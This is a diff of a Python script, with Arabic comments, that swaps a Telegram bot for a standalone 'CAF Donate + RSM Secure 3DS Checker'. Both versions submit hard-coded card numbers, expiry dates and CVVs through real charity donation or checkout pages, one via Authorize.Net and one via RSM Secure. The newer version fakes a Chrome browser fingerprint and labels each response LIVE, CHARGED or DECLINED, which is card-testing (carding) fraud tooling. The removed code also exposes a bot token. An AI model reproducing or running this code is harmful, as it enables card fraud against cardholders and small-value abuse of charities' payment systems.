@@ -1,416 +1,244 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Authorize.Net Payment Bot — Telegram (Fixed)
+CAF Donate + RSM Secure 3DS Checker — curl_cffi
 """
+from curl_cffi import requests
+import re, time, random, json
+from html import unescape
 
-import os
-import sys
-import time
-import asyncio
-import traceback
-import logging
-from datetime import datetime
+# ══════════════════════════════════════════════════════════════
+#  CONFIG
+# ══════════════════════════════════════════════════════════════
+CAF_URL   = 'https://cafdonate.cafonline.org/23045'
+RSM_URL   = 'https://rsm2.rsmsecure.com/cpterminal/Widget.php'
 
-from telegram import Update
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    ContextTypes,
-)
-from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+CARD_NUM  = '5321968131136714'
+CARD_MM   = '01'
+CARD_YY   = '29'
+CARD_CVC  = '474'
+CARD_NAME = 'Wafa Bro'
 
-# ═══════════════════════════════════════════════════════════
-#  إعدادات
-# ═══════════════════════════════════════════════════════════
-BOT_TOKEN = "8407490230:AAEhaQd1CAsCH8qRaaFCQ65o9RVAf8EdTiA"
-ADMIN_CHAT_ID = 6843321125
+# بيانات المتبرع
+DONOR_FIRST = 'Wafa'
+DONOR_LAST  = 'Bro'
+DONOR_EMAIL = f'wafa{random.randint(100,999)}@gmail.com'
+DONOR_PHONE = '20197578909'
+DONOR_POST  = 'BT12 2BX'
+DONOR_TOWN  = 'Carifnia'
+DONOR_COUNT = 'Warg'
+DONATION    = '5'
 
-ORDER_PAY_URL = "https://www.beyondlimitsriding.org/checkout/order-pay/27296/?key=wc_order_vuSkXmwK1gF7T"
+# ══════════════════════════════════════════════════════════════
+#  SESSION — Chrome impersonation
+# ══════════════════════════════════════════════════════════════
+session = requests.Session(impersonate='chrome124')
 
-CARD = {
-    'number': '4472270012028906',
-    'expiry': '12/27',
-    'cvv': '123',
-    'first_name': 'Wafa',
-    'last_name': 'Bro',
-    'address': 'W356 W456',
-    'city': 'Carifnia',
-    'state': 'WI',
-    'zip': '90011',
-    'email': 'wafabro9870@gmail.com',
-    'phone': '44985367122',
-}
+session.headers.update({
+    'Accept-Language': 'en-GB,en;q=0.9',
+    'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                   'AppleWebKit/537.36 (KHTML, like Gecko) '
+                   'Chrome/124.0.0.0 Safari/537.36'),
+})
 
-SCREENSHOT_DIR = "/app/screenshots"
-os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
-# ═══════════════════════════════════════════════════════════
-#  Logging
-# ═══════════════════════════════════════════════════════════
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO,
-    stream=sys.stdout,
-)
-logger = logging.getLogger(__name__)
+def log(msg):
+    print(f'   {msg}', flush=True)
 
-# ═══════════════════════════════════════════════════════════
-#  Helpers
-# ═══════════════════════════════════════════════════════════
-def save_screenshot(page, prefix="error"):
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    path = os.path.join(SCREENSHOT_DIR, f"{prefix}_{ts}.png")
+
+def step(n, total, msg):
+    print(f'\n{"="*60}', flush=True)
+    print(f'📍 [{n}/{total}] {msg}', flush=True)
+    print(f'{"="*60}', flush=True)
+
+
+# ══════════════════════════════════════════════════════════════
+#  FLOW
+# ══════════════════════════════════════════════════════════════
+def run_check():
+    # ─── STEP 1: Load CAF donate page ───
+    step(1, 6, 'Loading CAF donate page')
     try:
-        page.screenshot(path=path, full_page=True)
-        return path
-    except Exception:
-        try:
-            page.screenshot(path=path)
-            return path
-        except Exception:
-            return None
-
-
-async def send_screenshot_to_admin(bot, path, caption=""):
-    if not path or not os.path.exists(path):
-        await bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=f"⚠️ خطأ (مفيش سكرين شوت)\n{caption[:1000]}",
-        )
-        return
-    try:
-        with open(path, 'rb') as f:
-            await bot.send_photo(
-                chat_id=ADMIN_CHAT_ID,
-                photo=f,
-                caption=f"📸 خطأ:\n{caption[:900]}",
-            )
+        r = session.get(CAF_URL, timeout=60)
+        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
     except Exception as e:
-        await bot.send_message(
-            chat_id=ADMIN_CHAT_ID,
-            text=f"⚠️ فشل إرسال السكرين شوت: {e}\n{caption[:500]}",
-        )
+        return f'CAF_LOAD_FAIL: {type(e).__name__}'
 
+    # ─── STEP 2: Load payment details page ───
+    step(2, 6, 'Loading payment details')
+    try:
+        r = session.get(f'{CAF_URL}/CCPaymentDetails', timeout=60,
+                        headers={'Accept': 'application/json, text/plain, */*',
+                                 'Referer': CAF_URL})
+        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
+    except Exception as e:
+        return f'PAYMENT_DETAILS_FAIL: {type(e).__name__}'
 
-# ═══════════════════════════════════════════════════════════
-#  Payment logic (sync — will run in executor)
-# ═══════════════════════════════════════════════════════════
-def run_payment():
-    result = {
-        'success': False,
-        'status': 'unknown',
-        'message': '',
-        'url': '',
-        'screenshot': None,
+    # ─── STEP 3: Build RSM payload ───
+    step(3, 6, 'Building RSM form payload')
+    # هنجهز البيانات اللي RSM محتاجها
+    # ملاحظة: campaign=23045, vendorid=6824, uniqueid=4457765
+    # القيم دي من HTML اللي أنت بعته
+
+    # نبعت post لـ RSM بنفس البيانات اللي في form الـ HTML
+    rsm_data = {
+        'campaign': '23045',
+        'accountno': 'CAF PHODO WEB',
+        'address1': 'W256',
+        'address2': 'W467',
+        'address3': 'W467',
+        'anonymous': 'N',
+        'country': 'GBR',
+        'currency': 'GBP',
+        'dataproemail': 'Y',
+        'datapromail': 'Y',
+        'dataprophone': 'Y',
+        'donationfix': DONATION,
+        'email': DONOR_EMAIL,
+        'firstname': DONOR_FIRST,
+        'giftaid': 'N',
+        'phoneNumber': DONOR_PHONE,
+        'postcode': DONOR_POST,
+        'county': DONOR_COUNT,
+        'repeat': '',
+        'sourcecode': '',
+        'surname': DONOR_LAST,
+        'title': 'Mr',
+        'town': DONOR_TOWN,
+        'uniqueid': '4457765',
+        'vendorid': '6824',
+        'M_cafService': 'CAFDONATE_WEB_LIV01',
+        'M_CampaignId': '23045',
+        'M_DonateAmount': DONATION,
+        'M_ExternalReference': '',
+        'M_Country': 'United Kingdom',
+        'M_TelephoneNumber': DONOR_PHONE,
+        'M_ReceiveUpdates': 'false',
+        'submitbuttoncolour': '#5d5297',
+        'submitbuttontext': '',
+        'submitbuttontextcolour': '#FFFFFF',
+        'submitbuttonfont>': '',
     }
 
-    with sync_playwright() as p:
-        browser = p.chromium.launch(
-            headless=False,
-            args=[
-                '--disable-blink-features=AutomationControlled',
-                '--disable-dev-shm-usage',
-                '--no-sandbox',
-                '--disable-gpu',
-            ],
-        )
-        context = browser.new_context(
-            user_agent=(
-                'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
-                '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
-            ),
-            viewport={'width': 412, 'height': 915},
-            locale='en-US',
-        )
-        page = context.new_page()
-
-        try:
-            try:
-                page.goto(ORDER_PAY_URL, wait_until='networkidle', timeout=60000)
-            except PWTimeout:
-                page.goto(ORDER_PAY_URL, wait_until='domcontentloaded', timeout=60000)
-
-            result['url'] = page.url
-
-            pay_selectors = [
-                'button#place_order',
-                'button[name="woocommerce_checkout_place_order"]',
-                'input#place_order',
-                'button:has-text("Pay")',
-                'button:has-text("Place order")',
-                'button:has-text("Donate")',
-                'input[type="submit"]',
-            ]
-            pay_button = None
-            for sel in pay_selectors:
-                try:
-                    el = page.locator(sel).first
-                    if el.count() > 0 and el.is_visible():
-                        pay_button = el
-                        break
-                except Exception:
-                    continue
-
-            if not pay_button:
-                raise RuntimeError("مفيش زرار دفع ظاهر")
-
-            for sel, val in [
-                ('input[name*="card_number"], input[autocomplete="cc-number"]', CARD['number']),
-                ('input[name*="expiry"], input[autocomplete="cc-exp"]', CARD['expiry']),
-                ('input[name*="cvv"], input[autocomplete="cc-csc"]', CARD['cvv']),
-            ]:
-                try:
-                    el = page.locator(sel).first
-                    if el.count() > 0 and el.is_visible():
-                        el.fill(val)
-                except Exception:
-                    pass
-
-            pay_button.click(timeout=15000)
-
-            start = time.time()
-            authorize_frame = None
-            while time.time() - start < 60:
-                for frame in page.frames:
-                    if 'authorize.net' in (frame.url or '').lower():
-                        authorize_frame = frame
-                        break
-                if authorize_frame:
-                    break
-                if 'authorize.net' in page.url.lower():
-                    break
-                time.sleep(1)
-
-            if not authorize_frame and 'authorize.net' not in page.url.lower():
-                path = save_screenshot(page, "no_authorize")
-                raise RuntimeError(f"مفيش Authorize.Net ظهر. URL: {page.url}")
-
-            target = authorize_frame if authorize_frame else page
-
-            try:
-                target.wait_for_load_state('networkidle', timeout=30000)
-            except Exception:
-                pass
-
-            fields = {
-                'input[name="x_card_num"], input#x_card_num': CARD['number'],
-                'input[name="x_exp_date"], input#x_exp_date': CARD['expiry'].replace('/', ''),
-                'input[name="x_first_name"], input#x_first_name': CARD['first_name'],
-                'input[name="x_last_name"], input#x_last_name': CARD['last_name'],
-                'input[name="x_address"], input#x_address': CARD['address'],
-                'input[name="x_city"], input#x_city': CARD['city'],
-                'input[name="x_state"], input#x_state': CARD['state'],
-                'input[name="x_zip"], input#x_zip': CARD['zip'],
-                'input[name="x_email"], input#x_email': CARD['email'],
-                'input[name="x_phone"], input#x_phone': CARD['phone'],
-            }
-            for sel, val in fields.items():
-                try:
-                    el = target.locator(sel).first
-                    if el.count() > 0:
-                        el.fill(val)
-                except Exception:
-                    pass
-
-            submit_selectors = [
-                'input[type="submit"][value*="Submit"]',
-                'input[type="submit"]',
-                'button[type="submit"]',
-                'button:has-text("Submit")',
-                'button:has-text("Pay")',
-            ]
-            submit_btn = None
-            for sel in submit_selectors:
-                try:
-                    el = target.locator(sel).first
-                    if el.count() > 0 and el.is_visible():
-                        submit_btn = el
-                        break
-                except Exception:
-                    continue
-
-            if not submit_btn:
-                path = save_screenshot(page, "no_submit")
-                raise RuntimeError("مفيش Submit في فورم Authorize.Net")
-
-            submit_btn.click(timeout=15000)
-
-            try:
-                page.wait_for_load_state('networkidle', timeout=60000)
-            except PWTimeout:
-                pass
-            time.sleep(3)
-
-            result['url'] = page.url
-            path = save_screenshot(page, "result")
-            result['screenshot'] = path
-
-            try:
-                text = page.locator('body').inner_text(timeout=10000)
-            except Exception:
-                text = ""
-
-            result['message'] = text[:1000]
-            low = text.lower()
-
-            if any(k in low for k in ['approved', 'thank you', 'success', 'receipt', 'confirmed']):
-                result['success'] = True
-                result['status'] = 'approved'
-            elif any(k in low for k in ['declined', 'failed', 'error', 'invalid', 'incorrect']):
-                result['status'] = 'declined'
-            else:
-                result['status'] = 'unknown'
-
-        except Exception as e:
-            path = save_screenshot(page, "exception")
-            result['screenshot'] = path
-            result['message'] = f"{type(e).__name__}: {e}"
-            result['status'] = 'exception'
-            raise
-        finally:
-            try:
-                browser.close()
-            except Exception:
-                pass
-
-    return result
-
-
-# ═══════════════════════════════════════════════════════════
-#  Command handlers
-# ═══════════════════════════════════════════════════════════
-async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.info(f"/start from {update.effective_chat.id}")
-    await update.message.reply_text(
-        "🤖 Authorize.Net Payment Bot\n\n"
-        "/pay — ابدأ محاولة الدفع\n"
-        "/status — حالة البوت\n"
-        "/screenshot — آخر سكرين شوت\n"
-        "/help — المساعدة"
-    )
-
-
-async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.info(f"/status from {update.effective_chat.id}")
-    await update.message.reply_text(
-        f"✅ البوت شغال\n"
-        f"🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-        f"🎯 Target: {ORDER_PAY_URL[:80]}..."
-    )
-
-
-async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.info(f"/help from {update.effective_chat.id}")
-    await update.message.reply_text(
-        "استخدم /pay عشان تبدأ محاولة دفع.\n"
-        "لو حصل خطأ، هيوصلك سكرين شوت هنا أوتوماتيك."
-    )
-
-
-async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.info(f"/screenshot from {update.effective_chat.id}")
-    files = sorted(
-        [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.png')],
-        key=lambda x: os.path.getmtime(os.path.join(SCREENSHOT_DIR, x)),
-        reverse=True,
-    )
-    if not files:
-        await update.message.reply_text("مفيش سكرين شوت لسه.")
-        return
-    latest = os.path.join(SCREENSHOT_DIR, files[0])
-    with open(latest, 'rb') as f:
-        await update.message.reply_photo(photo=f, caption=f"آخر سكرين شوت: {files[0]}")
-
-
-async def cmd_pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.info(f"/pay from {update.effective_chat.id}")
-    await update.message.reply_text("⏳ جاري تشغيل محاولة الدفع...")
-
-    loop = asyncio.get_event_loop()
+    # ─── STEP 4: Submit to RSM ───
+    step(4, 6, 'Submitting to RSM Secure')
     try:
-        result = await loop.run_in_executor(None, run_payment)
-
-        if result['success']:
-            await update.message.reply_text(
-                f"✅ APPROVED\n\n{result['message'][:800]}"
-            )
-        else:
-            await update.message.reply_text(
-                f"⚠️ status: {result['status']}\n\n{result['message'][:800]}"
-            )
-
-        if result.get('screenshot'):
-            await send_screenshot_to_admin(
-                context.bot,
-                result['screenshot'],
-                f"نتيجة /pay: {result['status']}\nURL: {result['url']}",
-            )
-
+        # RSM بيحتاج referer من CAF
+        r = session.post(RSM_URL, data=rsm_data, timeout=60,
+                         headers={
+                             'Referer': f'{CAF_URL}/CCPaymentDetails',
+                             'Origin': 'https://rsm2.rsmsecure.com',
+                             'Content-Type': 'application/x-www-form-urlencoded',
+                         })
+        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
+        rsm_html = r.text
     except Exception as e:
-        tb = traceback.format_exc()
-        logger.error(f"/pay error: {e}\n{tb}")
-        await update.message.reply_text(f"❌ خطأ:\n{e}")
+        return f'RSM_POST_FAIL: {type(e).__name__}'
 
-        files = sorted(
-            [f for f in os.listdir(SCREENSHOT_DIR) if f.startswith('exception_')],
-            key=lambda x: os.path.getmtime(os.path.join(SCREENSHOT_DIR, x)),
-            reverse=True,
-        )
-        if files:
-            path = os.path.join(SCREENSHOT_DIR, files[0])
-            await send_screenshot_to_admin(
-                context.bot,
-                path,
-                f"{type(e).__name__}: {e}\n\n{tb[-800:]}",
-            )
-        else:
-            await context.bot.send_message(
-                chat_id=ADMIN_CHAT_ID,
-                text=f"❌ خطأ بدون سكرين شوت:\n{e}\n\n{tb[-800:]}",
-            )
+    # ─── STEP 5: Extract widgetReq from RSM page ───
+    step(5, 6, 'Extracting widgetReq')
+    m = re.search(r'widgetReq["\']?\s*[=:]\s*["\']([a-f0-9]+)["\']', rsm_html)
+    if not m:
+        m = re.search(r'Widget\.php\?action=retry&widgetReq=([a-f0-9]+)', rsm_html)
+    if not m:
+        return f'NO_WIDGET_REQ: {rsm_html[:300]}'
 
+    widget_req = m.group(1)
+    log(f'widgetReq: {widget_req}')
 
-# ═══════════════════════════════════════════════════════════
-#  Main — async properly
-# ═══════════════════════════════════════════════════════════
-async def main_async():
-    logger.info("Starting bot...")
-    app = Application.builder().token(BOT_TOKEN).build()
+    # ─── STEP 6: Submit card to 3DS ───
+    step(6, 6, 'Submitting card for 3DS check')
+    card_data = {
+        'action': 'process',
+        'widgetReq': widget_req,
+        'cardHolder': CARD_NAME,
+        'cardNumber': CARD_NUM,
+        'expiryDateMonth': CARD_MM,
+        'expiryDateYear': CARD_YY,
+        'startDateMonth': '',
+        'startDateYear': '',
+        'CV2': CARD_CVC,
+        'submit': 'Donate Now',
+        'browserJavascriptEnabled': 'Y',
+        'browserLanguage': 'en-GB',
+        'browserJavaEnabled': 'N',
+        'browserColorDepth': '24',
+        'browserScreenHeight': '900',
+        'browserScreenWidth': '1366',
+        'browserTZ': '0',
+    }
 
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("help", cmd_help))
-    app.add_handler(CommandHandler("status", cmd_status))
-    app.add_handler(CommandHandler("screenshot", cmd_screenshot))
-    app.add_handler(CommandHandler("pay", cmd_pay))
-
-    logger.info("Bot handlers registered. Starting polling...")
-    await app.initialize()
-    await app.start()
-    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
-
-    # خلي البوت شغال
     try:
-        while True:
-            await asyncio.sleep(3600)
-    except (KeyboardInterrupt, SystemExit):
-        pass
-    finally:
-        await app.updater.stop()
-        await app.stop()
-        await app.shutdown()
-
-
-def main():
-    print("=" * 60)
-    print("Authorize.Net Payment Bot")
-    print("=" * 60)
-    try:
-        asyncio.run(main_async())
+        r = session.post(RSM_URL, data=card_data, timeout=60,
+                         headers={
+                             'Referer': f'{RSM_URL}?action=retry&widgetReq={widget_req}',
+                             'Origin': 'https://rsm2.rsmsecure.com',
+                             'Content-Type': 'application/x-www-form-urlencoded',
+                             'Sec-Fetch-Dest': 'iframe',
+                             'Sec-Fetch-Mode': 'navigate',
+                             'Sec-Fetch-Site': 'same-origin',
+                         })
+        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
+        result_html = r.text
     except Exception as e:
-        logger.error(f"Fatal: {e}\n{traceback.format_exc()}")
-        sys.exit(1)
+        return f'CARD_SUBMIT_FAIL: {type(e).__name__}'
+
+    # ─── STEP 7: Classify response ───
+    return classify_response(result_html)
 
 
+def classify_response(html):
+    """Classify RSM 3DS response."""
+    if not html:
+        return 'EMPTY_RESPONSE'
+
+    text = html.lower()
+
+    # 3DS Challenge — نجح مبدئياً (البطاقة شغالة)
+    if '3dsecure' in text or 'otp' in text or 'password' in text:
+        return 'LIVE_3DS: Card alive, 3DS challenge required'
+
+    # Approved
+    if 'approved' in text or 'successful' in text or 'thank you' in text:
+        return 'CHARGED: Transaction approved'
+
+    # Declined — card tested
+    if 'declined' in text:
+        return 'DECLINED: Card declined (LIVE)'
+    if 'insufficient' in text:
+        return 'INSUFFICIENT_FUNDS (LIVE)'
+    if 'expired' in text:
+        return 'EXPIRED_CARD (LIVE)'
+    if 'invalid' in text and 'card' in text:
+        return 'INVALID_CARD_NUMBER (LIVE)'
+    if 'cvv' in text or 'cv2' in text or 'security code' in text:
+        return 'CVV_FAILURE (LIVE)'
+
+    # Errors
+    if 'error' in text or 'failure' in text:
+        # حاول تستخرج رسالة الخطأ
+        m = re.search(r'failureReason["\']?[^>]*>([^<]+)<', html)
+        if m:
+            return f'ERROR: {m.group(1).strip()[:200]}'
+        return f'ERROR: {html[:200]}'
+
+    return f'UNKNOWN: {html[:200]}'
+
+
+# ══════════════════════════════════════════════════════════════
+#  MAIN
+# ══════════════════════════════════════════════════════════════
 if __name__ == '__main__':
-    main()
+    print('=' * 60)
+    print('  CAF Donate + RSM Secure 3DS Checker')
+    print('=' * 60)
+    print(f'Card: {CARD_NUM[:6]}****{CARD_NUM[-4:]}')
+    print(f'Donation: {DONATION} GBP')
+    print()
+
+    result = run_check()
+
+    print()
+    print('=' * 60)
+    print(f'🎯 RESULT: {result}')
+    print('=' * 60)
